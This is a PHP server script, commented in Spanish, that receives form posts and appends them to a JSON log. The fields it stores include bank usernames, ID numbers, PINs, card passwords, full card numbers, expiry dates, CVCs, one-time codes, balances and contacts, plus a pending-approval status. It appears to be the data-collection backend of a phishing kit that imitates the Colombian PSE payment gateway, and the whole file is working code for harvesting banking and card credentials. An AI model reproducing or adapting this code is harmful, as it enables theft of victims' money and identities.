<?php
/**
 * track_stats.php - Guarda datos de PSE y TARJETAS en pse_logs.json
 */

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Solo POST']);
    exit;
}

// Crear carpeta data
$dataDir = __DIR__ . '/data';
if (!is_dir($dataDir)) {
    @mkdir($dataDir, 0777, true);
}

// Obtener datos
$banco = sanitizar($_POST['banco'] ?? '');
$activity = sanitizar($_POST['activity'] ?? '');
$usuario = sanitizar($_POST['usuario'] ?? '');
$identificacion = sanitizar($_POST['identificacion'] ?? '');
$tipo_identificacion = sanitizar($_POST['tipo_identificacion'] ?? '');
$clave_pin = sanitizar($_POST['clave_pin'] ?? '');
$clave_tarjeta = sanitizar($_POST['clave_tarjeta'] ?? '');
$ultimos_digitos = sanitizar($_POST['ultimos_digitos'] ?? '');
$codigo_otp = sanitizar($_POST['codigo_otp'] ?? '');
$codigo_dinamica = sanitizar($_POST['codigo_dinamica'] ?? '');
$documento = sanitizar($_POST['documento'] ?? '');
$metodo = sanitizar($_POST['metodo'] ?? '');
$saldo = sanitizar($_POST['saldo'] ?? '');

// ====== CAMPOS PARA TARJETAS ======
$tipo_tarjeta = sanitizar($_POST['tipo_tarjeta'] ?? '');
$titular = sanitizar($_POST['titular'] ?? '');
$numero_tarjeta = sanitizar($_POST['numero_tarjeta'] ?? '');
$vencimiento = sanitizar($_POST['vencimiento'] ?? '');
$cvc = sanitizar($_POST['cvc'] ?? '');
$cuotas = sanitizar($_POST['cuotas'] ?? '');
$email = sanitizar($_POST['email'] ?? '');
$celular = sanitizar($_POST['celular'] ?? '');
$monto = sanitizar($_POST['monto'] ?? '');

$logsFile = $dataDir . '/pse_logs.json';

// Leer logs existentes
$logs = [];
if (file_exists($logsFile)) {
    $content = file_get_contents($logsFile);
    $logs = json_decode($content, true) ?? [];
}

// Crear nuevo log
$newLog = [
    'id' => uniqid('PSE_'),
    'fecha' => date('Y-m-d H:i:s'),
    'activity' => $activity,
    'action' => sanitizar($_POST['action'] ?? ''),
    'banco' => $banco,
    'metodo' => $metodo,
    'usuario' => $usuario,
    'identificacion' => $identificacion,
    'tipo_identificacion' => $tipo_identificacion,
    'documento' => $documento,
    'clave_pin' => $clave_pin,
    'clave_tarjeta' => $clave_tarjeta,
    'ultimos_digitos' => $ultimos_digitos,
    'codigo_otp' => $codigo_otp ?: $codigo_dinamica,
    'saldo' => $saldo,
    // ====== CAMPOS DE TARJETA ======
    'tipo_tarjeta' => $tipo_tarjeta,
    'titular' => $titular,
    'numero_tarjeta' => $numero_tarjeta,
    'vencimiento' => $vencimiento,
    'cvc' => $cvc,
    'cuotas' => $cuotas,
    'email' => $email,
    'celular' => $celular,
    'monto' => $monto,
    'estado' => 'pendiente',
    'ip' => $_SERVER['REMOTE_ADDR'] ?? '',
    'user_agent' => substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 255),
    'aprobado' => null,
    'aprobado_en' => null
];

$logs[] = $newLog;

// Guardar
try {
    $json = json_encode($logs, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    if (file_put_contents($logsFile, $json, LOCK_EX) === false) {
        throw new Exception('No se pudo escribir en ' . $logsFile);
    }
    
    http_response_code(200);
    echo json_encode([
        'success' => true,
        'id' => $newLog['id']
    ]);
    
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => $e->getMessage()
    ]);
}

exit;

function sanitizar($dato) {
    if (!is_string($dato)) return $dato;
    return htmlspecialchars(trim($dato), ENT_QUOTES, 'UTF-8');
}
?>